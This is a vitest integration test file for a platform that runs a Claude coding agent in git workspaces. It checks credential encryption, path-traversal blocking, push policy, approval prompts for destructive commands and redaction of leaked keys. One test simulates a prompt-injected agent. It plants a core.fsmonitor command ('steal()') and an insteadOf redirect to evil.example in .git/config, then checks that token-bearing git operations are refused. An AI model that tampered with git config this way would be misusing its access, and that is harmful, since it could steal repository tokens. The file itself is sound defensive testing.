import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { AgentDriver, AgentEvent, AgentRunInput } from '../src/agents/driver.js';
import { runGit } from '../src/git/git.js';
import { withWorkspaceLock } from '../src/workspaces/paths.js';
import { Client, PASSWORD, seedOrg, setup, type TestEnv } from './helpers.js';

/**
 * Workspaces, git and the agent, end to end over HTTP. Git runs against a local bare
 * repository standing in for GitHub; Claude is replaced by a scripted driver that uses
 * the same canUseTool callback the real SDK calls.
 */

type Script = (input: AgentRunInput) => AsyncGenerator<AgentEvent>;
let script: Script = async function* () {};
const driver: AgentDriver = { run: (input) => script(input) };

let env: TestEnv;
let tmp: string;
let bare: string;
let admin: Client;
let dev: Client;
let other: Client;
let appId: string;
let devEnvId: string;
let prodEnvId: string;
let wsId: string;

const author = { name: 'Seeder', email: 'seed@test' };

async function waitFor<T>(fn: () => Promise<T | undefined>, ms = 30_000): Promise<T> {
  const end = Date.now() + ms;
  for (;;) {
    const v = await fn();
    if (v !== undefined) return v;
    if (Date.now() > end) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 100));
  }
}

async function events(sessionId: string) {
  return env.db.system((q) =>
    q.query<{ kind: string; data: Record<string, unknown> }>('SELECT kind, data FROM agent_events WHERE session_id = $1 ORDER BY id', [sessionId]),
  );
}

async function waitIdle(sessionId: string) {
  return waitFor(async () => {
    const evs = await events(sessionId);
    const last = evs.at(-1);
    return last?.kind === 'status' && last.data.state === 'idle' && evs.length > 2 ? evs : undefined;
  });
}

beforeAll(async () => {
  // A bare repo with one commit on main, standing in for GitHub.
  tmp = await mkdtemp(path.join(os.tmpdir(), 'ep-git-'));
  bare = path.join(tmp, 'origin.git');
  const seed = path.join(tmp, 'seed');
  await runGit(['init', '--bare', '-b', 'main', bare], { cwd: tmp });
  await runGit(['clone', bare, seed], { cwd: tmp, allowLocalRemote: true });
  await writeFile(path.join(seed, 'README.md'), '# Payments\n');
  await writeFile(path.join(seed, 'retry.js'), 'export const retries = 3;\n');
  await runGit(['add', '-A'], { cwd: seed });
  await runGit(['commit', '-m', 'initial'], { cwd: seed, author });
  await runGit(['push', 'origin', 'HEAD:main'], { cwd: seed, allowLocalRemote: true });

  env = await setup({ remoteFor: () => bare, agentDriver: driver });
  const { adminEmail } = await seedOrg(env.db, 'acme');
  admin = await Client.login(env.app, adminEmail);

  const clientId = (await admin.post('/api/clients', { name: 'ABC' })).json().id;
  const created = (await admin.post(`/api/clients/${clientId}/applications`, { name: 'Payments' })).json();
  appId = created.id;
  devEnvId = created.environments.find((e: { kind: string }) => e.kind === 'development').id;
  prodEnvId = created.environments.find((e: { kind: string }) => e.kind === 'production').id;

  for (const email of ['dev@acme.test', 'other@acme.test']) {
    await admin.post('/api/users', { email, displayName: email.split('@')[0], password: PASSWORD });
  }
  const users = (await admin.get('/api/users')).json() as { id: string; email: string }[];
  for (const u of users.filter((u) => u.email !== adminEmail)) {
    await admin.post('/api/grants', { userId: u.id, role: 'developer', scopeType: 'application', scopeId: appId });
  }
  dev = await Client.login(env.app, 'dev@acme.test');
  other = await Client.login(env.app, 'other@acme.test');
});

afterAll(async () => {
  await env.close();
  await rm(tmp, { recursive: true, force: true, maxRetries: 3 });
});

describe('settings and credentials', () => {
  it('stores credentials encrypted and only ever returns a hint', async () => {
    const key = 'sk-ant-api03-' + 'a'.repeat(40) + 'WXYZ';
    expect((await dev.request('PUT', '/api/me/credentials/anthropic_api_key', { value: key })).statusCode).toBe(200);
    const settings = await dev.get('/api/me/settings');
    expect(settings.body).not.toContain(key);
    expect(settings.json().credentials.anthropic_api_key).toMatchObject({ saved: true, hint: '…WXYZ' });
    const [row] = await env.db.system((q) => q.query<{ ciphertext: string }>("SELECT ciphertext FROM user_credentials WHERE kind = 'anthropic_api_key'"));
    expect(row!.ciphertext).not.toContain(key);
    expect(row!.ciphertext.startsWith('v1.')).toBe(true);
  });

  it('rejects a subscription token pasted into the API key field', async () => {
    const r = await dev.request('PUT', '/api/me/credentials/anthropic_api_key', { value: 'sk-ant-oat01-' + 'b'.repeat(40) });
    expect(r.statusCode).toBe(400);
  });

  it('saves auth mode and model', async () => {
    const r = await dev.request('PUT', '/api/me/settings', { authMode: 'subscription', defaultModel: 'opus' });
    expect(r.json()).toMatchObject({ authMode: 'subscription', defaultModel: 'opus' });
    await dev.request('PUT', '/api/me/settings', { authMode: 'api_key', defaultModel: 'default' });
  });
});

describe('repository and workspace', () => {
  it('only app admins can connect the repository', async () => {
    expect((await dev.request('PUT', `/api/applications/${appId}/repository`, { url: 'https://github.com/abc/payments' })).statusCode).toBe(403);
    expect((await admin.request('PUT', `/api/applications/${appId}/repository`, { url: 'https://evil.com/abc/payments' })).statusCode).toBe(400);
    const r = await admin.request('PUT', `/api/applications/${appId}/repository`, { url: 'https://github.com/abc/payments', defaultBranch: 'main' });
    expect(r.statusCode).toBe(200);
    expect(r.json()).toMatchObject({ owner: 'abc', name: 'payments', defaultBranch: 'main' });
  });

  it('refuses a workspace on production without an explicit grant', async () => {
    const r = await dev.post(`/api/applications/${appId}/workspaces`, { environmentId: prodEnvId, branch: 'feature/x' });
    expect(r.statusCode).toBe(403);
  });

  it('creates a workspace on a new branch', async () => {
    const r = await dev.post(`/api/applications/${appId}/workspaces`, { environmentId: devEnvId, branch: 'feature/retry' });
    expect(r.statusCode).toBe(202);
    wsId = r.json().id;
    const ws = await waitFor(async () => {
      const w = (await dev.get(`/api/workspaces/${wsId}`)).json();
      return w.state === 'creating' ? undefined : w;
    });
    expect(ws.state, ws.error).toBe('ready');
    expect(ws.branch).toBe('feature/retry');
  });

  it('is private to its owner', async () => {
    expect((await other.get(`/api/workspaces/${wsId}`)).statusCode).toBe(404);
    expect((await other.get(`/api/workspaces/${wsId}/tree`)).statusCode).toBe(404);
  });

  it('lists, reads and writes files but never outside the checkout', async () => {
    const tree = (await dev.get(`/api/workspaces/${wsId}/tree`)).json();
    expect(tree.entries.map((e: { path: string }) => e.path)).toEqual(expect.arrayContaining(['README.md', 'retry.js']));
    expect(tree.entries.some((e: { path: string }) => e.path.startsWith('.git'))).toBe(false);

    expect((await dev.get(`/api/workspaces/${wsId}/file?path=retry.js`)).json().content).toContain('retries = 3');
    expect((await dev.request('PUT', `/api/workspaces/${wsId}/file`, { path: 'retry.js', content: 'export const retries = 5;\n' })).statusCode).toBe(200);

    expect((await dev.get(`/api/workspaces/${wsId}/file?path=../../home/x`)).statusCode).toBe(400);
    expect((await dev.request('PUT', `/api/workspaces/${wsId}/file`, { path: '.git/config', content: 'x' })).statusCode).toBe(403);
  });

  it('shows status and a diff', async () => {
    const status = (await dev.get(`/api/workspaces/${wsId}/git/status`)).json();
    expect(status.branch).toBe('feature/retry');
    expect(status.files).toEqual([expect.objectContaining({ path: 'retry.js', status: 'modified' })]);
    const diff = (await dev.get(`/api/workspaces/${wsId}/git/diff?path=retry.js`)).json();
    expect(diff.original).toContain('retries = 3');
    expect(diff.modified).toContain('retries = 5');
  });

  it('commits as the developer and pushes the feature branch', async () => {
    const commit = await dev.post(`/api/workspaces/${wsId}/git/commit`, { message: 'Increase retries' });
    expect(commit.statusCode).toBe(200);
    const log = (await dev.get(`/api/workspaces/${wsId}/git/log`)).json();
    expect(log[0]).toMatchObject({ subject: 'Increase retries', author: 'dev' });

    expect((await dev.post(`/api/workspaces/${wsId}/git/push`)).statusCode).toBe(200);
    const remoteBranches = await runGit(['branch', '--list'], { cwd: bare });
    expect(remoteBranches).toContain('feature/retry');
  });

  it('will not use the GitHub token if .git/config was tampered with', async () => {
    // Simulates a prompt-injected agent editing git config to run a command during push.
    const repo = path.join(env.workspacesDir, wsId, 'repo');
    await runGit(['config', '--local', 'core.fsmonitor', 'node -e "steal()"'], { cwd: repo });
    const r = await dev.post(`/api/workspaces/${wsId}/git/push`);
    expect(r.statusCode).toBe(403);
    expect(r.json().error.message).toMatch(/core\.fsmonitor/);
    await runGit(['config', '--local', 'url.https://evil.example/.insteadOf', 'https://github.com/'], { cwd: repo });
    await runGit(['config', '--local', '--unset', 'core.fsmonitor'], { cwd: repo });
    expect((await dev.post(`/api/workspaces/${wsId}/git/fetch`)).statusCode).toBe(403);
    await runGit(['config', '--local', '--remove-section', 'url.https://evil.example/'], { cwd: repo });
    expect((await dev.post(`/api/workspaces/${wsId}/git/push`)).statusCode).toBe(200);
  });

  it('pulls the pushed branch (fetch with token, merge without)', async () => {
    const r = await dev.post(`/api/workspaces/${wsId}/git/pull`);
    expect(r.statusCode, r.body).toBe(200);
  });

  it('refuses to push to the default branch', async () => {
    expect((await dev.post(`/api/workspaces/${wsId}/git/checkout`, { branch: 'main' })).statusCode).toBe(200);
    const r = await dev.post(`/api/workspaces/${wsId}/git/push`);
    expect(r.statusCode).toBe(403);
    expect((await dev.post(`/api/workspaces/${wsId}/git/checkout`, { branch: 'feature/retry' })).statusCode).toBe(200);
  });

  it('discards a change', async () => {
    await dev.request('PUT', `/api/workspaces/${wsId}/file`, { path: 'scratch.txt', content: 'tmp' });
    await dev.request('PUT', `/api/workspaces/${wsId}/file`, { path: 'README.md', content: 'changed' });
    expect((await dev.post(`/api/workspaces/${wsId}/git/discard`, { path: 'scratch.txt' })).statusCode).toBe(200);
    expect((await dev.post(`/api/workspaces/${wsId}/git/discard`, { path: 'README.md' })).statusCode).toBe(200);
    expect((await dev.get(`/api/workspaces/${wsId}/git/status`)).json().files).toEqual([]);
  });
});

describe('agent runs', () => {
  it('streams a conversation and records cost', async () => {
    let seen: AgentRunInput | undefined;
    script = async function* (input) {
      seen = input;
      yield { kind: 'session', sdkSessionId: 'sdk-1' };
      yield { kind: 'text', text: 'Retries are configured in retry.js' };
      yield { kind: 'result', isError: false, subtype: 'success', costUsd: 0.05, inputTokens: 100, outputTokens: 20, durationMs: 500, text: 'Done' };
    };
    const r = await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'Where are retries configured?', mode: 'plan' });
    expect(r.statusCode).toBe(200);
    const evs = await waitIdle(r.json().sessionId);
    expect(evs.map((e) => e.kind)).toEqual(['user', 'status', 'text', 'result', 'status']);

    expect(seen!.mode).toBe('plan');
    expect(seen!.cwd).toMatch(/repo$/);
    expect(seen!.env.ANTHROPIC_API_KEY).toMatch(/^sk-ant-api03-/);
    expect(seen!.env.CLAUDE_CONFIG_DIR).toMatch(/home[\\/]\.claude$/);
    expect(seen!.model).toBe('default');

    const sessions = (await dev.get(`/api/workspaces/${wsId}/agent/sessions`)).json();
    expect(sessions.sessions[0]).toMatchObject({ costUsd: 0.05, inputTokens: 100, outputTokens: 20 });
  });

  it('captures the plan from ExitPlanMode and stops', async () => {
    script = async function* (input) {
      const res = await input.canUseTool('ExitPlanMode', { plan: '1. Change retry.js\n2. Add tests' }, { signal: new AbortController().signal } as never);
      expect(res.behavior).toBe('deny');
    };
    const { sessionId } = (await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'Plan the refactor', mode: 'plan' })).json();
    const evs = await waitIdle(sessionId);
    expect(evs.find((e) => e.kind === 'plan')?.data.plan).toContain('Change retry.js');
  });

  it('blocks git push by policy', async () => {
    let decision: unknown;
    script = async function* (input) {
      decision = await input.canUseTool('Bash', { command: 'git push origin main' }, { signal: new AbortController().signal } as never);
    };
    const { sessionId } = (await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'push it', mode: 'execute' })).json();
    const evs = await waitIdle(sessionId);
    expect(decision).toMatchObject({ behavior: 'deny' });
    expect(evs.some((e) => e.kind === 'policy_denied')).toBe(true);
  });

  it('pauses for approval on destructive commands and resumes on approve', async () => {
    let decision: unknown;
    script = async function* (input) {
      decision = await input.canUseTool('Bash', { command: 'rm -rf build' }, { signal: new AbortController().signal } as never);
      yield { kind: 'text', text: 'continued' };
    };
    const { sessionId } = (await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'clean build', mode: 'execute' })).json();
    const request = await waitFor(async () => (await events(sessionId)).find((e) => e.kind === 'approval_request'));

    // Only the owner can answer, and a second run cannot start meanwhile.
    expect((await other.post(`/api/workspaces/${wsId}/agent/approvals/${request.data.approvalId}`, { allow: true })).statusCode).toBe(404);
    expect((await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'x', mode: 'plan' })).statusCode).toBe(409);

    expect((await dev.post(`/api/workspaces/${wsId}/agent/approvals/${request.data.approvalId}`, { allow: true })).statusCode).toBe(200);
    const evs = await waitIdle(sessionId);
    expect(decision).toMatchObject({ behavior: 'allow' });
    expect(evs.map((e) => e.kind)).toContain('approval_decision');
    expect(evs.some((e) => e.kind === 'text' && e.data.text === 'continued')).toBe(true);
  });

  it('can be cancelled', async () => {
    script = async function* (input) {
      const signal = input.abortController.signal;
      if (!signal.aborted) await new Promise<void>((resolve) => signal.addEventListener('abort', () => resolve()));
      throw new Error('aborted');
    };
    const { sessionId } = (await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'long task', mode: 'execute' })).json();
    await waitFor(async () => ((await dev.get(`/api/workspaces/${wsId}/agent/sessions`)).json().running ? true : undefined));
    expect((await dev.post(`/api/workspaces/${wsId}/agent/cancel`)).json().cancelled).toBe(true);
    const evs = await waitIdle(sessionId);
    expect(evs.some((e) => e.kind === 'cancelled')).toBe(true);
  });

  it('redacts the credential if it ever appears in output', async () => {
    script = async function* (input) {
      yield { kind: 'text', text: `oops ${input.env.ANTHROPIC_API_KEY}` };
    };
    const { sessionId } = (await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'leak', mode: 'plan' })).json();
    const evs = await waitIdle(sessionId);
    expect(JSON.stringify(evs)).not.toMatch(/sk-ant-api03-a{10}/);
    expect(evs.find((e) => e.kind === 'text')?.data.text).toBe('oops [redacted]');
  });

  it('needs a credential for the chosen mode', async () => {
    await dev.request('PUT', '/api/me/settings', { authMode: 'subscription' });
    const r = await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'hi', mode: 'plan' });
    expect(r.statusCode).toBe(400);
    expect(r.json().error.message).toMatch(/subscription token/);
    await dev.request('PUT', '/api/me/settings', { authMode: 'api_key' });
  });
});

describe('recent work and conversation management', () => {
  it('lists the caller’s recent workspaces with their latest conversation', async () => {
    const recent = (await dev.get('/api/me/recent')).json() as { id: string; sessionTitle: string; sessionCount: number; applicationName: string }[];
    const mine = recent.find((r) => r.id === wsId)!;
    expect(mine).toMatchObject({ applicationName: 'Payments' });
    expect(mine.sessionCount).toBeGreaterThan(1);
    expect(mine.sessionTitle).toBeTruthy();
    expect((await other.get('/api/me/recent')).json().find((r: { id: string }) => r.id === wsId)).toBeUndefined();
  });

  it('deletes a conversation, only by its owner', async () => {
    const { sessions } = (await dev.get(`/api/workspaces/${wsId}/agent/sessions`)).json() as { sessions: { id: string }[] };
    const target = sessions.at(-1)!.id;
    expect((await other.delete(`/api/agent/sessions/${target}`)).statusCode).toBe(404);
    expect((await dev.delete(`/api/agent/sessions/${target}`)).statusCode).toBe(200);
    const after = (await dev.get(`/api/workspaces/${wsId}/agent/sessions`)).json().sessions as { id: string }[];
    expect(after.map((s) => s.id)).not.toContain(target);
    const [row] = await env.db.system((q) => q.query<{ n: number }>('SELECT count(*)::int AS n FROM agent_events WHERE session_id = $1', [target]));
    expect(row!.n).toBe(0);
  });

  it('will not start Claude while a git operation holds the workspace', async () => {
    let release!: () => void;
    const held = withWorkspaceLock(wsId, () => new Promise<void>((r) => (release = r)));
    const r = await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'x', mode: 'plan' });
    expect(r.statusCode).toBe(409);
    expect(r.json().error.message).toMatch(/git operation/);
    release();
    await held;
  });

  it('refuses to delete the conversation Claude is working in', async () => {
    script = async function* (input) {
      const signal = input.abortController.signal;
      if (!signal.aborted) await new Promise<void>((resolve) => signal.addEventListener('abort', () => resolve()));
      throw new Error('aborted');
    };
    const { sessionId } = (await dev.post(`/api/workspaces/${wsId}/agent/run`, { prompt: 'busy', mode: 'execute' })).json();
    expect((await dev.delete(`/api/agent/sessions/${sessionId}`)).statusCode).toBe(409);
    // No token-bearing git while Claude (or anything it started) could be editing .git/config.
    for (const op of ['push', 'pull', 'fetch']) {
      expect((await dev.post(`/api/workspaces/${wsId}/git/${op}`)).statusCode, op).toBe(409);
    }
    await dev.post(`/api/workspaces/${wsId}/agent/cancel`);
    await waitIdle(sessionId);
    expect((await dev.delete(`/api/agent/sessions/${sessionId}`)).statusCode).toBe(200);
  });
});

describe('workspace deletion', () => {
  it('removes the workspace', async () => {
    expect((await dev.delete(`/api/workspaces/${wsId}`)).statusCode).toBe(200);
    expect((await dev.get(`/api/workspaces/${wsId}`)).statusCode).toBe(404);
  });
});
